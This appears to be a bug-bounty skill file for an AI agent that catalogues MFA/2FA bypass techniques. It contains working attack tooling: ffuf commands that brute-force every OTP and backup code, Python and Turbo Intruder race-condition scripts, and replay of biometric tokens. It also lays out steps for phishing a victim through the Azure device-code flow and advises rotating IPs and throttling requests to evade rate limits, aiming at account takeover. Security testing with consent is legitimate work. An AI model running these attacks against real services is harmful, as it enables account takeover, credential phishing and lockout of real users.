---
name: hunt-mfa-bypass
description: "Hunt MFA / 2FA bypass — 7 distinct patterns. (1) MFA not enforced on sensitive endpoints (password change, email change accept without MFA challenge), (2) MFA-step skip via direct navigation to post-login URL, (3) MFA-token replay (same code accepted twice), (4) brute-force the 6-digit OTP without rate limit (10^6 attempts at server speed), (5) race condition on OTP validation, (6) recovery-code dump via /api/me, (7) backup factor downgrade (SMS factor with no rate limit). Plus the chain: cookie theft + password oracle + no step-up = ATO without MFA challenge. Detection: trace auth flow in Burp, find every state transition, check if MFA is middleware-gated vs per-endpoint, check OTP entropy and rate limit on OTP-validate. Validate: attacker session reaching post-MFA state. Use when hunting auth bypass, MFA flows, chaining primitives toward ATO."
sources: bug_bounty_reports, hackerone_public
report_count: 15
---

## 19. MFA / 2FA BYPASS
> Growing bug class — 7 distinct patterns. Pays High/Critical when it enables ATO without prior session.

### Pattern 1: No Rate Limit on OTP
```bash
# Test with ffuf — all 1M 6-digit codes
ffuf -u "https://target.com/api/verify-otp" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 -t 5
# -t 5 (slow down) — aggressive rates get 429 or ban
```

### Pattern 2: OTP Not Invalidated After Use
```
1. Login → receive OTP "123456" → enter it → success
2. Logout → login again with same credentials
3. Try OTP "123456" again
4. If accepted → OTP never invalidated = ATO (attacker sniffs OTP once, reuses forever)
```

### Pattern 3: Response Manipulation
```
1. Enter wrong OTP → capture response in Burp
2. Change {"success":false} → {"success":true} (or 401 → 200)
3. Forward → if app proceeds → client-side only MFA check
```

### Pattern 4: Skip MFA Step (Workflow Bypass)
```bash
# After entering password, app sets a "pre-mfa" cookie → redirects to /mfa
# Test: skip /mfa entirely, access /dashboard directly with pre-mfa cookie
# If app grants access without MFA = auth flow bypass = Critical
curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard
```

### Pattern 5: Race on MFA Verification
```python
import asyncio, aiohttp

async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify",
                            json={"otp": otp}) as r:
        return r.status, await r.text()

async def race():
    cookies = {"session": "YOUR_SESSION"}
    async with aiohttp.ClientSession(cookies=cookies) as s:
        # Fire ~30 concurrent submissions of the SAME OTP to hit the TOCTOU
        # window before the server marks it used. Two requests are NOT enough —
        # they almost always resolve sequentially as "already-used" (false negative).
        # Best done as a single-packet / 20+ HTTP-2-stream attack (Turbo Intruder).
        results = await asyncio.gather(*[verify(s, "123456") for _ in range(30)])
        # Race confirmed if >1 success (or 1 success among many "already-used").
        for status, body in results:
            print(status, body)
asyncio.run(race())
```

### Pattern 6: Backup Code Brute Force
```
Backup codes: typically 8 alphanumeric = 36^8 = ~2.8T (too large)
BUT: check if backup codes are only 6-8 digits = 1-10M range = feasible with no rate limit
Also test: can backup codes be reused after exhaustion? Some apps regenerate predictably.
```

### Pattern 7: "Remember This Device" Trust Escalation
```
1. Complete MFA once on Device A (attacker's browser)
2. Capture the "remember device" cookie
3. Present that cookie from a new IP/browser
4. If MFA skipped = device trust not bound to IP/UA = ATO from any location
```

### MFA Chain Escalation
```
Rate limit bypass + no lockout = ATO (Critical)
Response manipulation = client-side only check = Critical
Skip MFA step = auth flow bypass = Critical
OTP reuse = persistent session hijack = High
```
### Pattern 8: OAuth Device Code Flow MFA Bypass
```
Device authorization grant (RFC 8628) - skips interactive user-agent,
meaning MFA challenge is NEVER presented. The device code flow has no
session where the IdP can enforce an MFA step-up.

Detection:
  curl -s "https://target.com/.well-known/oauth-authorization-server" | jq ".device_authorization_endpoint"
  # If present -> device code flow enabled; test if MFA is bypassed

Azure exploitation example:
  1. POST to https://login.microsoftonline.com/<tenant>/oauth2/v2.0/devicecode
     Body: client_id=<app_id>&scope=user.read%20openid
     -> Returns device_code, user_code, verification_uri
  2. Attacker sends user_code to victim via phishing -> victim enters code
  3. Meanwhile attacker polls: POST https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token
     Body: grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=<device_code>&client_id=<app_id>
  4. On victim approval -> attacker receives access_token + refresh_token
  5. If app does NOT enforce MFA on device code grant -> token without MFA check
```

### Pattern 9: Backup Code Brute Force (ffuf-based)
```
Recovery/backup codes often have lower entropy than advertised - some IdPs
use sequential or timestamp-seeded codes. Test with ffuf:

  ffuf -u "https://target.com/api/mfa/verify-backup" \
    -X POST -H "Content-Type: application/json" \
    -H "Cookie: session=YOUR_SESSION" \
    -d '{"backup_code":"FUZZ"}' \
    -w <(seq -w 00000000 99999999) \
    -fc 400,401,429 -t 10 -p 0.1-0.5

  Key checks:
  - Purely numeric? 8-digit = 100M (feasible in hours at 5K req/s)
  - Format-locked? (e.g., "XXXX-XXXX" - hyphen reduces search space)
  - Per-IP rate limiting? Rotate IPs if per-IP, not per-code
  - Invalidated after use? If not -> reuse same code for all accounts
```

### Pattern 10: MFA via SSO Bypass
```
SSO integrated with MFA at IdP level, but SP-initiated SSO (Service Provider
initiates SAML/OIDC flow) may skip MFA if IdP does not re-auth:

  1. User authenticates to IdP with password only (no MFA)
  2. IdP issues SAML assertion or ID token WITHOUT MFA claim (amr != mfa)
  3. SP trusts assertion without checking acr/amr values -> grants access

Detection:
  - Check SAML AuthnContextClassRef for expected MFA class
  - OIDC: decode ID token JWT, check the "amr" claim
  - If SP accepts tokens without "mfa" in amr -> bypass confirmed

Test: initiate SP login -> intercept SAML/OIDC request -> strip MFA params ->
forward to IdP. If assertion issued without MFA challenge -> SP grants access
```

### Pattern 11: Biometric MFA Bypass
```
Server-side biometric verification (fingerprint scan, face match) where raw
biometric data or match-result token is sent to server can be replayed.

  1. Intercept biometric submission in Burp (Base64 image or match token)
  2. Capture the "biometric_verified: true" response or signed assertion
  3. Replay same payload in new session (different browser/device)
  4. If accepted without freshness (nonce, timestamp, device binding) -> bypass

Common weak implementations:
  - Static biometric challenge (not per-session nonce)
  - JWT result lacking "iat"/"jti" claims -> replayable
  - Server trusts client-reported "passed" boolean

Detection: capture token, wait 5 min, replay in Burp Repeater. If accepted ->
no freshness check. POST /api/biometric/verify {"token":"eyJ..."}
```

## Updated Detection Methodology
```
Trace full auth flow in Burp Proxy HTTP history with explicit state transitions:

  1. Credential submission      ->  POST /api/login          -> set-cookie, redirect
  2. MFA challenge request      ->  GET /mfa/challenge       -> challenge data
  3. MFA verification           ->  POST /api/mfa/verify     -> auth token/cookie
  4. Post-MFA resource access   ->  GET /dashboard           -> 200 OK (authed)
  5. Sensitive action (no MFA)  ->  POST /api/change-password -> 200 (no step-up)

Check each transition:
  - Can (1->4) be forced by skipping (2->3)? (Pattern 4 - workflow bypass)
  - Does (3) accept the same payload twice? (Pattern 2 - OTP reuse)
  - Is (3) idempotent under concurrent load? (Pattern 5 - race condition)
  - Does (5) bypass MFA step-up? (Pattern 1 variant - sensitive endpoint)

JWT audit after each step:
  for token in $(cat captured_tokens.txt); do
    echo "$token" | cut -d. -f2 | base64 -d 2>/dev/null | jq ".amr, .acr, .mfa, .auth_time"
  done
  # Look for: missing "mfa" claim, stale "auth_time", missing "amr":["mfa"]
```

## Turbo Intruder PoC - MFA Race Conditions
```python
"""Turbo Intruder script for MFA race-conditions (Pattern 5 - advanced).
Single-packet attack via HTTP/2 connection reuse - fires 30+ OTP submissions
in one TCP segment before the server processes any, maximizing TOCTOU."""

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    # Fire 30 parallel OTP submissions on the SAME session
    for i in range(30):
        engine.queue(target.req, {"otp":"123456"}, learn=0)

def handleResponse(req, interesting):
    table.add(req)
    if chr(34)+"success"+chr(34)+":true" in req.response:
        print(f"[RACE WIN] Request {req.id} succeeded - MFA race confirmed")
        print(req.response[:500])
```

## Race-Condition Validation Checklist
```
1. Run >=30 parallel requests (2-5 is insufficient - sequential resolution)
2. Use HTTP/2 single-packet attack (Turbo Intruder BURP2 or Python h2 library)
3. Confirm >1 requests return {"success": true} (or 1 success + N "already_used")
4. Verify the OTP is consumed afterward (replay should fail)
5. Document: server-side atomicity gap confirmed - all OTP codes are vulnerable
```

---

## Related Skills & Chains

- **`hunt-ato`** — MFA bypass is a primitive; ATO is the destination. Chain primitive: cookie theft (via XSS or session-fixation) + password oracle (login response timing/length diff reveals valid passwords without lockout) + no MFA step-up on password-change endpoint = persistent ATO without ever facing the OTP challenge → password rotated, attacker locks victim out.
- **`hunt-race-condition`** — Pattern 5 (OTP race) lives in race-condition territory; load both skills together. Chain primitive: same 6-digit OTP submitted via 20 parallel HTTP/2 streams (single-packet Turbo Intruder attack) before the server marks it used → 1 success + 19 "already-used" → race window confirmed → attacker doesn't need to brute, just guesses once and parallelizes → ATO.
- **`hunt-auth-bypass`** — MFA-step-skip is auth-flow bypass at the workflow layer. Chain primitive: pre-MFA cookie issued after password step + direct navigation to `/dashboard` skipping `/mfa` route + server only middleware-gates `/mfa` not `/dashboard` = full post-auth access from password-only state → MFA never enforced because the route gate was misplaced.
- **`hunt-misc`** — Recovery-code dump via `/api/me` is a misc-class info disclosure that becomes Critical when chained. Chain primitive: `/api/me` returns full user object including `backup_codes` array (plaintext, never rotated) → attacker with any read-IDOR or XSS exfils backup codes → uses one backup code → MFA satisfied → ATO without OTP knowledge.
- **`security-arsenal`** — Pull the OTP-brute-force payload section (000000-999999 wordlist generator, ffuf rate-limit-evasion patterns with `-t 5 -p 0.5-2`, distributed-IP rotation via proxychains) and the JWT-token-replay table when "MFA satisfied" claim lives in a JWT claim that can be forged.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an MFA bypass that only works when the attacker already has the password. Standalone MFA bypass is High; chained-with-password-oracle is Critical; chained-with-cookie-theft-only is Critical. The chain question separates the two.

